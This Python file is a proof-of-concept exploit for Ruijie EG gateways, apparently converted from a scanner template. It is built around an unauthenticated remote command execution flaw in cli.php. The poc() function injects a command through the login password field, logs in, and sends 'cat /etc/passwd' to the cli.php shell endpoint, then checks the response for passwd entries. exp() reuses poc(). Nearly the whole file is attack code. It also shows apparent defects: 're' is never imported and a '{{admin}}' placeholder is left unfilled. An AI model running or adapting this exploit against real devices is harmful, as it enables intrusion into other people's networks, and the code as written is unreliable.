import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Ruijie EG cli.php RCE''',
        "description": '''A vulnerability in Ruikie EG's cli.php end point allows remote unauthenticated attackers to gain 'admin' privileges. The vulnerability is exploitable because an unauthenticated user can gain 'admin' privileges due to a vulnerability in the login screen.''',
        "severity": "critical",
        "references": [
            "https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20cli.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md", 
            "https://www.ruijienetworks.com"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["ruijie", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        s = requests.Session()

        path = """/login.php"""
        method = "POST"
        data = """username=admin&password=admin?show+webmaster+user"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/login.php"""
        method = "POST"
        data = """username=admin&password={{admin}}"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/cli.php?a=shell"""
        method = "POST"
        data = """notdelay=true&command=cat /etc/passwd"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'}
        resp2 = s.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp2.text) and re.search(r"""nobody:.*:0:0""",resp2.text)) and (resp2.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url